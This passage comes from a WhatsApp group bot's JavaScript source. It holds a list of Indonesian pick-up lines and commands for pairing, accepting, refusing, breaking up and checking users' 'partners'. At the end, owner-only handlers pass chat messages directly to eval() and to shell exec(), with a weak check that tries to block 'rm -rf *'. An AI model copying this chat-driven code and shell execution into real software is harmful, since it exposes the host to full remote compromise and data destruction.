membiarkan aku menjadi orangnya?", "kamu tahu enggak kenapa aku ngambil jurusan elektro? karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.", "kamu tahu kenapa hari ini aku menyatakan semua ini padamu? karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.", "kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?", "kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. aku mau kamu jadi milikku.", "kepada cewek incaran bukanlah perkara yang mudah. ada banyak hal yang perlu dipertimbangkan agar cintamu bisa diterima si doi. selain memilih waktu yang tepat, kata-kata untuk nembak cewek pun harus dipersiapkan.", "ketika aku bertemu denganmu, aku tak peduli dengan semuanya. namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. dan apakah ini cinta?", "ketika engkau memandangku, engkau akan melihat fisikku. tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.", "ketika hawa tercipta buat sang adam, begitu indah kehidupan mereka. izinkan aku menjadi sang adam/hawa buatmu karena aku sangat mencintaimu.", "ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.", "kita udah saling tahu masa lalu masing-masing. tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?", "ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. resah jika kamu tak menjadi milikku selamanya.", "lebih spesial dari nasi goreng, lebih indah dari purnama. ya, jika kamu yang temani akhir hidupku.", "maaf sebelumnya karena cuma bisa bilang lewat wa. sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. mau?", "makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.", "makan tahu bumbu petis. merenung sambil makan buah duku. aku bukan lelaki yang romantis. namun, maukah kau jadi pacarku?", "makasih, ya, selama ini sudah mau temani aku. entah itu dalam suka ataupun duka. tapi sekarang aku mau kamu berubah. aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.", "malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.", "mau jadi pacarku nggak, lagi gabut nih. coba dulu 1 bulan kalau nyaman lanjut deh.", "menjadi teman memang menyenangkan. akan lebih membahagiakan jika kamu menjadi milikku.", "meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya. - zarry hendrik", "meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.", "mungkin aku bukan obama, tapi aku senang kalau bisa manggil kamu, o sayang. kamu mau nggak mulai saat ini aku panggil seperti itu?", "mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. tapi satu yang aku sanggup, membuatmu bahagia. izinkan aku membuktikannya, ya!", "neng, bakar-bakaran yuk! | bakar apa? | kita bakar masa lalu dan buka lembaran baru dengan cinta kita.", "nggak perlu basa basi. kita udah kenal lama, aku suka kamu apa adanya. jadian yuk!", "pepatah mengatakan, empat sehat lima sempurna. namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.", "saatnya aku mengungkapkan perasaan yang terdalam kepadamu. aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.", "saking jatuh cintanya aku sama kamu. mendengar kamu kentut aja aku sudah bahagia.", "satu tambah satu sama dengan dua. aku tanpamu nggak bisa apa-apa. satu dua tiga sepuluh. aku maunya kamu jadi pacarku.", "secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.", "sejak kenal kamu, bawaannya pengin belajar terus. belajar jadi yang terbaik. untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?", "senjata bertuah amatlah sakti. kalah oleh iman nan hakiki. maukah kau jadi orang yang aku kasihi? aku janji cintaku sampai mati.", "seseorang bermimpi tentangmu setiap malam. seseorang tidak bisa bernapas tanpamu, kesepian. seseorang berharap suatu hari kau akan melihatnya. seseorang itu adalah aku.", "setelah hari berlalu, aku yakin kamu pilihanku.", "setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. aku mencintaimu.", "suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. perempuan itu adalah kamu.", "suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?", "tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.", "tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.", "tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.", "tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. itu adalah kamu.", "telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. karena aku mau kamu jadi pacar aku?", "tidak peduli seberapa sederhanya dan ketidakjelasan kamu. tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. aku mau kamu jadi pacarku.", "untuk apa memajang foto berdua? yang aku mau fotomu ada dalam buku nikahku kelak. maukah kamu jadi pacarku?"
];
					let katakata = await pickRandom(ktnmbk)
				    let teks = `love Message...\n\n> @${m.sender.split("@")[0]}\n❤️❤️\n@${users.split("@")[0]}\n\n"${katakata}"`
					conn.jadian[users] = [
						reply(),
						m.sender
					]
                    let hehe = `kamu baru saja mengajak @${users.split("@")[0]} jadian\n\n@${users.split("@")[0]} silahkan beri keputusan\n${prefix}terima atau ${prefix}tolak`
                    conn.sendMessage(m.chat, {
                        text: hehe,
                        footer: "© ꓘIuuR N7 - 2025",
                        buttons: [ 
                            {
                                buttonId: `${prefix}terima`,
                                buttonText: {
                                    displayText: 'terima' 
                                }, type: 1 },
                            {
                                buttonId: `${prefix}tolak`,
                                buttonText: {
                                    displayText: 'ogah'
                                }, type: 1 }
                        ],
                        headerType: 1,
                        viewOnce: true
                        },{ quoted: m })
                }
			}
			break
                
			case 'terima': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					global.db.data.users[user].pacar = m.sender
					global.db.data.users[m.sender].pacar = user
					reply(`horeee\n\n${m.sender.split("@")[0]} jadian dengan\n❤️ ${user.split("@")[0]}\n\nsemoga langgeng `)
					delete conn.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'tolak': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				if (conn.jadian[m.sender]) {
					let user = conn.jadian[m.sender][1]
					reply(`@${user.split("@")[0]} wowkaowka di tolak`)
					delete conn.jadian[m.sender]
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'putus': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				let pasangan = global.db.data.users[m.sender].pacar
				if (pasangan) {
					global.db.data.users[m.sender].pacar = ""
					global.db.data.users[pasangan].pacar = ""
					reply(`horeee kamu putus sama @${pasangan.split("@")[0]}`)
				} else {
					reply("anjirr?")
				}
			}
			break
                
			case 'cekpacar': {
                if (isBan) return
				if (!m.isGroup) return reply(mess.group)
				try {
					let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					if (!user) return reply(`tag/reply seseorang, contoh: ${prefix + command} @628888`)
					let pasangan = global.db.data.users[user].pacar
					if (pasangan) {
						reply(`@${user.split("@")[0]} udah ❤️ sama @${pasangan.split("@")[0]}`)
					} else {
						reply(`@${user.split("@")[0]} masih jomblo`)
					}
				} catch (error) {
                      let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
					reply(`@${user.split("@")[0]} tidak ada didalam database njrrr`)
				}
			}
			break
                
default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await reply(evaled);
    } catch (e) {
        await reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    if (text == "rm -rf *") return m.reply("")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}

}
} catch (err) {               console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
